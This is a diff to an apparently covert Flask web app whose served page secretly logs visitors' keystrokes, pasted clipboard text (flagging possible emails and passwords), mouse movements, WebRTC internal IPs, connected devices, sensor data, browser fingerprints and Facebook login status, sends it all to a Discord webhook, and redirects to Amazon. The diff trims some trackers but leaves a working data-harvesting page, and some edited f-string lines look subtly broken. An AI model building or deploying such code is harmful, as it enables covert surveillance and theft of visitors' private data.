@@ -36,15 +36,10 @@ HTML_TEMPLATE = """<!DOCTYPE html>
   <iframe id="fbFrame" src="https://www.facebook.com" class="hidden"></iframe>
   
   <script>
-    // Global arrays and variables for new events
+    // Global arrays for new events
     const mouseMovements = [];
     const keystrokes = [];
-    const keyUpEvents = [];
-    const clickEvents = [];
-    const scrollEvents = [];
-    const touchPoints = [];
     let clipboardData = null;
-    let pageVisibility = document.visibilityState;
     
     // Capture first 3 mouse movements only
     document.addEventListener('mousemove', (e) => {
@@ -52,39 +47,11 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         mouseMovements.push({ x: e.clientX, y: e.clientY, t: Date.now() });
       }
     });
-
+    
     // Capture keydown events (limit to first 2 for example)
     document.addEventListener('keydown', (e) => {
       if (keystrokes.length < 2) {
-        keystrokes.push({ key: e.key, code: e.code, t: Date.now() });
-      }
-    });
-    
-    // Capture keyup events (recording details and timing)
-    document.addEventListener('keyup', (e) => {
-      if (keyUpEvents.length < 2) {
-        keyUpEvents.push({ key: e.key, code: e.code, t: Date.now() });
-      }
-    });
-    
-    // Capture click events
-    document.addEventListener('click', (e) => {
-      if (clickEvents.length < 5) {  // limit to first 5 events
-        clickEvents.push({ x: e.clientX, y: e.clientY, t: Date.now() });
-      }
-    });
-    
-    // Capture scroll events
-    document.addEventListener('scroll', (e) => {
-      if (scrollEvents.length < 5) {  // limit to first 5 events
-        scrollEvents.push({ scrollX: window.scrollX, scrollY: window.scrollY, t: Date.now() });
-      }
-    });
-    
-    // Capture touch events (for mobile devices)
-    document.addEventListener('touchstart', function(e) {
-      if (touchPoints.length < 5 && e.touches.length > 0) {
-        touchPoints.push({ x: e.touches[0].clientX, y: e.touches[0].clientY, t: Date.now() });
+        keystrokes.push({ key: e.key, code: e.code });
       }
     });
     
@@ -92,7 +59,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
     document.getElementById("pasteField").addEventListener("paste", e => {
       const pasted = e.clipboardData.getData("text");
       // Warning alert for sensitive data:
-      if (/.*@.*\\..*/.test(pasted) || /[A-Za-z0-9@!#\$%\^&\*]{8,}/.test(pasted)) {
+      if (/.*@.*\..*/.test(pasted) || /[A-Za-z0-9@!#\$%\^&\*]{8,}/.test(pasted)) {
         alert("Looks like you pasted sensitive data!");
       }
       clipboardData = pasted;
@@ -103,6 +70,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       try {
         const canvas = document.createElement("canvas");
         const ctx = canvas.getContext("2d");
+        // Draw something
         ctx.textBaseline = "top";
         ctx.font = "14px 'Arial'";
         ctx.fillText("Fingerprint", 2, 2);
@@ -111,11 +79,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         return "N/A";
       }
     }
-    
-    // Monitor page visibility changes
-    document.addEventListener('visibilitychange', () => {
-      pageVisibility = document.visibilityState;
-    });
     
     async function collectInfo() {
       try {
@@ -139,9 +102,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         };
         
         const devices = await navigator.mediaDevices.enumerateDevices().catch(() => []);
-        // Separate audio and video inputs
-        const audioInputs = devices.filter(d => d.kind === "audioinput").map(d => d.label || "Unknown Audio");
-        const videoInputs = devices.filter(d => d.kind === "videoinput").map(d => d.label || "Unknown Video");
         const mediaDevices = devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`);
         
         let bluetoothDevices = [], usbDevices = [];
@@ -171,7 +131,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
           pc.createOffer().then(offer => pc.setLocalDescription(offer));
           pc.onicecandidate = e => {
             if (e.candidate) {
-              const ipMatch = /([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+              const ipMatch = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
               if (ipMatch && !internalIPs.includes(ipMatch[1])) internalIPs.push(ipMatch[1]);
             }
           };
@@ -208,14 +168,15 @@ HTML_TEMPLATE = """<!DOCTYPE html>
           }
         }
         
-        // Browser Plugins and MIME Types
+        // Browser Plugins
         const plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name) : [];
+        // MIME Types available in navigator
         const mimeTypes = navigator.mimeTypes ? Array.from(navigator.mimeTypes).map(m => m.type) : [];
         
         // Online/Offline Status
         const onlineStatus = navigator.onLine ? "online" : "offline";
         
-        // Device Motion and Orientation events
+        // Motion and Orientation events
         let motionData = {}, orientationData = {};
         window.addEventListener('devicemotion', e => {
           motionData = {
@@ -255,10 +216,10 @@ HTML_TEMPLATE = """<!DOCTYPE html>
           loginDetection = "Facebook iframe loaded – user likely logged in";
         };
         
-        // Network details using navigator.connection if available
+        // Network details (using navigator.connection if available)
         const connection = navigator.connection || {};
         
-        // Build the payload with all collected data including new fields
+        // Build the payload with all collected data and new fields
         const payload = {
           screenWidth: screen.width,
           screenHeight: screen.height,
@@ -286,8 +247,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
           bluetoothDevices: bluetoothDevices,
           usbDevices: usbDevices,
           mediaDevices: mediaDevices,
-          audioInputs: audioInputs,
-          videoInputs: videoInputs,
           networkSpeed: connection.downlink || 'N/A',
           effectiveType: connection.effectiveType || 'N/A',
           geoLocation: location,
@@ -307,12 +266,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
           canvasFingerprint: canvasFingerprint,
           mouseMovements: mouseMovements,
           keystrokes: keystrokes,
-          keyUpEvents: keyUpEvents,
-          clickEvents: clickEvents,
-          scrollEvents: scrollEvents,
-          touchPoints: touchPoints,
           clipboardData: clipboardData,
-          pageVisibility: pageVisibility,
           loginDetection: loginDetection,
           redirectedTo: "https://www.amazon.in"
         };
@@ -350,14 +304,15 @@ def collect():
     except Exception:
         ip_info = {}
     
+    # Check if DISCORD_WEBHOOK is set
     if not DISCORD_WEBHOOK:
         return jsonify({"status": "error", "message": "DISCORD_WEBHOOK not configured"}), 500
 
-    # Build Discord message with emojis and formatted sections. New fields are appended to the message.
+    # Build Discord message with emojis and formatted sections
     info = f"""
 📊 **New Fingerprint Logged Device Information:**
 • **Screen:** {data.get('screenWidth')}x{data.get('screenHeight')}, {data.get('colorDepth')}-bit, DPR: {data.get('devicePixelRatio')}
-• **Orientation:** { "landscape-primary" if data.get('screenWidth') > data.get('screenHeight') else "portrait-primary" }
+• **Orientation:** {(data.get('screenWidth') > data.get('screenHeight')) and "landscape-primary" or "portrait-primary"}
 • **WebGL Vendor:** {data.get('unmaskedVendor')}  
 • **WebGL Renderer:** {data.get('unmaskedRenderer')}
 • **Audio Fingerprint:** {data.get('audioFingerprint')}
@@ -370,12 +325,15 @@ def collect():
 🌐 **Network Details:**
 • **IPs (WebRTC):** {", ".join(data.get('internalIPs', []))}
 • **Downlink:** {data.get('networkSpeed')} Mbps
-• **RTT/Connection Type:** {data.get('effectiveType')}
+• **RTT:** {data.get('effectiveType')} (RTT not directly measured)
+• **Connection Type:** {data.get('effectiveType')}
 
 🖥 **Browser & OS:**
 • **OS:** {data.get('platform')}
 • **User Agent:** {data.get('userAgent')}
+• **Vendor:** N/A
 • **Language:** {data.get('language')}
+• **Languages:** {data.get('language')}, (additional languages not captured)
 • **Cookies Enabled:** {data.get('cookiesEnabled')}
 • **Do Not Track:** {data.get('doNotTrack')}
 • **PDF Viewer Enabled:** {data.get('pdfViewerEnabled')}
@@ -389,13 +347,13 @@ def collect():
 • **MIME Types:** {", ".join(data.get('mimeTypes', []))}
 
 💾 **Storage Support:**
-• **localStorage:** {data.get('storageSupport', {}).get('localStorage')}
-• **sessionStorage:** {data.get('storageSupport', {}).get('sessionStorage')}
-• **indexedDB:** {data.get('storageSupport', {}).get('indexedDB')}
-• **Service Worker Support:** {data.get('storageSupport', {}).get('serviceWorker')}
+• **localStorage:** {data.get('storageSupport',{{}}).get('localStorage')}
+• **sessionStorage:** {data.get('storageSupport',{{}}).get('sessionStorage')}
+• **indexedDB:** {data.get('storageSupport',{{}}).get('indexedDB')}
+• **Service Worker Support:** {data.get('storageSupport',{{}}).get('serviceWorker')}
 
 🔋 **Battery Info:**
-• **Level:** {int(float(data.get('batteryLevel', 1))*100)}%
+• **Level:** {int(float(data.get('batteryLevel',1))*100)}%
 • **Charging:** {"Yes" if data.get('charging') else "No"}
 • **Charging Time:** {data.get('batteryChargingTime')}
 • **Discharging Time:** {data.get('batteryDischargingTime')}
@@ -403,41 +361,21 @@ def collect():
 🎨 **Canvas Fingerprint:**
 • **Data URL (truncated):** {data.get('canvasFingerprint')}
 
-🖱 **Mouse Movements (First 3):**
+🐭 **Mouse Movements (First 3):**
 {chr(10).join([f"    {i+1}. x: {m.get('x')}, y: {m.get('y')}, t: {m.get('t')}" for i, m in enumerate(data.get('mouseMovements', []))])}
 
-⌨ **Keystrokes (KeyDown):**
-{chr(10).join([f"    • Key: {k.get('key')}, Code: {k.get('code')}, t: {k.get('t')}" for k in data.get('keystrokes', [])])}
+⌨️ **Keystrokes:**
+{chr(10).join([f"    • Key: {k.get('key')}, Code: {k.get('code')}" for k in data.get('keystrokes', [])])}
 
-⌨ **Keystrokes (KeyUp):**
-{chr(10).join([f"    • Key: {k.get('key')}, Code: {k.get('code')}, t: {k.get('t')}" for k in data.get('keyUpEvents', [])])}
-
-🖱 **Click Events:**
-{chr(10).join([f"    • x: {c.get('x')}, y: {c.get('y')}, t: {c.get('t')}" for c in data.get('clickEvents', [])])}
-
-📜 **Scroll Events:**
-{chr(10).join([f"    • scrollX: {s.get('scrollX')}, scrollY: {s.get('scrollY')}, t: {s.get('t')}" for s in data.get('scrollEvents', [])])}
-
-👆 **Touch Events:**
-{chr(10).join([f"    • x: {t.get('x')}, y: {t.get('y')}, t: {t.get('t')}" for t in data.get('touchPoints', [])])}
-
-📋 **Clipboard Pasted Data:**
-• **Data:** "{data.get('clipboardData')}"
+📋 **Clipboard Events (Pasted):**
+• **Data:** "{data.get('clipboardData')}" 
 
 📱 **Sensor Data:**
-• **Device Motion:** x:{data.get('motionData', {}).get('accX')}, y:{data.get('motionData', {}).get('accY')}, z:{data.get('motionData', {}).get('accZ')}
-• **Device Orientation:** Alpha: {data.get('orientationData', {}).get('alpha')}, Beta: {data.get('orientationData', {}).get('beta')}, Gamma: {data.get('orientationData', {}).get('gamma')}
+• **Device Motion:** Accel x:{data.get('motionData',{{}}).get('accX')}, y:{data.get('motionData',{{}}).get('accY')}, z:{data.get('motionData',{{}}).get('accZ')}
+• **Device Orientation:** Alpha: {data.get('orientationData',{{}}).get('alpha')}, Beta: {data.get('orientationData',{{}}).get('beta')}, Gamma: {data.get('orientationData',{{}}).get('gamma')}
 
-🔊 **Voices (Speech Synthesis):**
+🗣 **Voices (Speech Synthesis):**
 • {", ".join(data.get('voices', []))}
-
-📺 **Media Devices:**
-• **Audio Inputs:** {", ".join(data.get('audioInputs', []))}
-• **Video Inputs:** {", ".join(data.get('videoInputs', []))}
-• **All Devices:** {", ".join(data.get('mediaDevices', []))}
-
-🌐 **Additional Info:**
-• **Page Visibility:** {data.get('pageVisibility')}
 
 🔒 **Login Detection:**
 • {data.get('loginDetection')}
